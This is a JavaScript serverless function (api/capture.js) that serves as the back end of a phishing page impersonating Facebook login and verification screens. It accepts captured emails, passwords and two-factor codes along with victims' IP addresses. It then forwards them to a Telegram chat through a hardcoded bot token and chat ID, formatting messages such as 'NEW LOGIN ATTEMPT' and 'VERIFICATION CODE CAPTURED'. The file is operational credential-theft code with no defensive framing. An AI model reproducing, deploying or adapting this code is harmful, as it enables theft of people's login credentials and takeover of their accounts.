// api/capture.js - Vercel Serverless Function
const https = require('https');

// Telegram credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8228437015:AAF4ebqdhrsn3rkQLRRhv-KHlyUleDrCZXw';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '1622637334';

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Parse request body
    let data;
    if (typeof req.body === 'string') {
      try {
        data = JSON.parse(req.body);
      } catch (e) {
        data = {};
      }
    } else {
      data = req.body || {};
    }
    
    // Add timestamp and IP
    data.timestamp = new Date().toISOString();
    data.ip = req.headers['x-forwarded-for'] || 
              req.headers['x-real-ip'] || 
              req.connection.remoteAddress || 
              'Unknown';
    
    // Log to Vercel console
    console.log('📥 DATA CAPTURED:', {
      type: data.type || 'unknown',
      email: data.email ? data.email.substring(0, 3) + '...' : 'no email',
      timestamp: data.timestamp,
      ip: data.ip
    });
    
    // Send to Telegram (fire and forget)
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      sendToTelegram(data).catch(err => {
        console.log('⚠️ Telegram error (non-critical):', err.message);
      });
    } else {
      console.log('⚠️ Telegram credentials not configured');
    }
    
    // Return success immediately
    return res.status(200).json({
      success: true,
      message: 'Data received',
      timestamp: data.timestamp
    });
    
  } catch (error) {
    console.error('❌ SERVER ERROR:', error);
    return res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
};

// Function to send message to Telegram
function sendToTelegram(data) {
  return new Promise((resolve, reject) => {
    const message = formatTelegramMessage(data);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    
    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const req = https.request(url, options, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log('✅ Telegram message sent successfully');
          resolve(responseData);
        } else {
          console.log(`❌ Telegram API error: ${res.statusCode}`);
          reject(new Error(`Telegram API error: ${res.statusCode}`));
        }
      });
    });
    
    req.on('error', (error) => {
      console.log('❌ Network error:', error.message);
      reject(error);
    });
    
    req.write(postData);
    req.end();
  });
}

// Format Telegram message
function formatTelegramMessage(data) {
  const type = data.type || 'unknown';
  const email = data.email || 'N/A';
  const password = data.password || 'N/A';
  const code = data.code || 'N/A';
  const time = new Date(data.timestamp).toLocaleString();
  const ip = data.ip || 'Unknown';
  const userAgent = data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'N/A';
  
  let message = '';
  
  switch (type) {
    case 'login':
      message = `🔐 *NEW LOGIN ATTEMPT*

📧 *Email:* \`${escapeMarkdown(email)}\`
🔑 *Password:* \`${escapeMarkdown(password)}\`
🌐 *User Agent:* ${userAgent}
⏰ *Time:* ${time}
📱 *Source:* Facebook Login Page

📍 *IP:* ${ip}`;
      break;
      
    case 'verification':
      message = `✅ *VERIFICATION CODE CAPTURED*

📧 *Email:* \`${escapeMarkdown(email)}\`
🔑 *Password:* \`${escapeMarkdown(password)}\`
🔢 *Code:* \`${escapeMarkdown(code)}\`
⏰ *Time:* ${time}
📱 *Source:* Facebook Verification Page

📍 *IP:* ${ip}`;
      break;
      
    case 'resend':
      message = `🔄 *RESEND REQUEST*

📧 *Email:* \`${escapeMarkdown(email)}\`
⏰ *Time:* ${time}
📱 *Source:* Facebook Verification Page

📍 *IP:* ${ip}`;
      break;
      
    default:
      message = `📥 *DATA CAPTURED*

*Type:* ${type}
*Email:* \`${escapeMarkdown(email)}\`
*Time:* ${time}
*IP:* ${ip}`;
  }
  
  return message;
}

// Escape special characters for Markdown
function escapeMarkdown(text) {
  if (!text) return '';
  return text.toString()
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}